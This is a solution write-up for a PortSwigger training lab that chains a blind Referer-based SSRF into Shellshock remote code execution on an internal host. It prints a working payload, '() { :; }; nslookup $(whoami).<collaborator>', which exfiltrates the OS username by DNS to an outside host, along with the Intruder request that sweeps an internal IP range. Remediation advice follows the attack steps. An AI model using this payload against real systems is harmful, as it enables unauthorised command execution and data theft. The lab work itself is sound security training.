# Lab 07 — Blind SSRF with Shellshock Exploitation

[![Category](https://img.shields.io/badge/Category-SSRF-red)]()
[![Type](https://img.shields.io/badge/Type-Blind%20SSRF%20to%20RCE%20(Shellshock)-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Expert-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> Part of the [SSRF Labs](./README.md) series — PortSwigger Web Security Academy.

---


## 1. Overview

| Field | Detail |
|---|---|
| **Vulnerability Class** | Blind SSRF chained into Remote Code Execution (CVE-2014-6271 — Shellshock) |
| **Weakness (CWE)** | CWE-918 (chained with CWE-78 — OS Command Injection) |
| **Difficulty** | Expert |
| Source | PortSwigger Web Security Academy |
| **Objective** | Use the blind `Referer`-based SSRF to attack an internal `192.168.0.X:8080` host with a Shellshock payload and exfiltrate the OS username via DNS |

## 2. Summary

This lab builds directly on Lab 05's blind, `Referer`-driven SSRF, but instead of only proving the SSRF primitive exists, the goal is to use it to attack a vulnerable internal service. One host within the internal `192.168.0.0/24` range on port 8080 runs software affected by **Shellshock (CVE-2014-6271)** — a Bash vulnerability where HTTP headers forwarded into CGI environment variables can trigger arbitrary command execution. By combining IP-range brute-forcing (to find the vulnerable host) with a Shellshock payload embedded in the `User-Agent` header (forwarded by the SSRF-vulnerable analytics fetch) and DNS-based exfiltration, the OS username of the internal host can be recovered despite the entire chain being blind.

## 3. Proof of Concept (PoC)

1. Confirm (as in Lab 05) that visiting a product page triggers a `Referer`-based out-of-band HTTP request, and that the analytics fetch also forwards the original `User-Agent` header to the destination.
2. Send the product-page request to Burp Intruder.
3. Generate a unique Burp Collaborator subdomain and build a Shellshock payload around it:
   ```
   () { :; }; /usr/bin/nslookup $(whoami).<collaborator-subdomain>
   ```
4. Set the `User-Agent` header to this payload.
5. Set the `Referer` header to `http://192.168.0.1:8080` and mark the final IP octet as the Intruder payload position: `http://192.168.0.§1§:8080`.
6. Configure a **Numbers** payload set (`From=1`, `To=255`, `Step=1`) and run the attack across the full internal range.
7. Once the attack completes, poll Burp Collaborator for DNS interactions.
8. Identify the interaction whose subdomain begins with the vulnerable host's OS username and submit that username as the lab's solution.

## 4. Evidence

**Intruder request template:**
```
GET /product?productId=1 HTTP/1.1
Host: <lab-id>.web-security-academy.net
Referer: http://192.168.0.§1§:8080
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).je3k2z1x9c1y2b3.oastify.com
```

**Collaborator interaction (on the successful host):**
```
Type: DNS — A record lookup
Looked-up domain: carlos.je3k2z1x9c1y2b3.oastify.com
```

**Recovered value:** `carlos` (submitted as the lab's solution).

## 5. Root Cause Analysis

**Attacker perspective:** Three independent weaknesses are chained:
1. The public-facing analytics component performs an SSRF-vulnerable fetch of whatever URL appears in `Referer`, and forwards the original request's `User-Agent` header along with it.
2. An internal host on the reachable private network runs a CGI-based web server backed by a Bash version vulnerable to Shellshock, which maps incoming HTTP headers (like `User-Agent`) into environment variables such as `HTTP_USER_AGENT`.
3. Vulnerable Bash versions execute any trailing commands appended after a specially-crafted function definition (`() { :; };`) the moment such an environment variable is parsed — turning the forwarded `User-Agent` header into arbitrary command execution on the internal host.

Brute-forcing the IP range (as in Lab 02) locates the specific vulnerable host, and because the entire chain is blind end-to-end, DNS-based out-of-band exfiltration (`nslookup $(whoami).<collaborator-domain>`) is used to read back the result of the injected command — the current OS user — one DNS query at a time.

**Defender perspective:** This lab illustrates how a "merely" blind SSRF — often (incorrectly) treated as lower severity because it can't directly leak data — becomes a full remote-code-execution primitive once it can reach an internal host with its own, unrelated vulnerability. Severity assessments for blind SSRF should always account for what internal systems the vulnerable server can reach, not just what the SSRF itself can directly prove.

## 6. Impact

Full remote code execution on an internal back-end host, achieved entirely through blind, out-of-band techniques with no direct response ever seen by the attacker. In a real environment this could be leveraged for lateral movement, credential theft, persistent backdoors, or further pivoting deeper into internal infrastructure — all while remaining invisible to anyone monitoring only the public-facing application's HTTP responses.

## 7. Remediation

- Fix the SSRF at its source, as in Lab 05: do not perform header-driven server-side fetches without strict destination validation, and do not forward sensitive/attacker-controlled headers (like the original `User-Agent`) onward to internal systems.
- Patch all internal systems against known, high-severity vulnerabilities such as Shellshock — internal-only exposure is not a substitute for timely patching.
- Apply network segmentation so that components with SSRF-prone functionality (like the analytics fetcher) cannot reach sensitive internal infrastructure at all.
- Treat blind SSRF findings with the same urgency as regular SSRF during triage — their real-world severity depends on what's reachable, not on whether the response is visible.

## 8. References

- [PortSwigger — Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind)
- [NVD — CVE-2014-6271 (Shellshock)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Burp Collaborator documentation](https://portswigger.net/burp/documentation/collaborator)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html) / [CWE-78](https://cwe.mitre.org/data/definitions/78.html)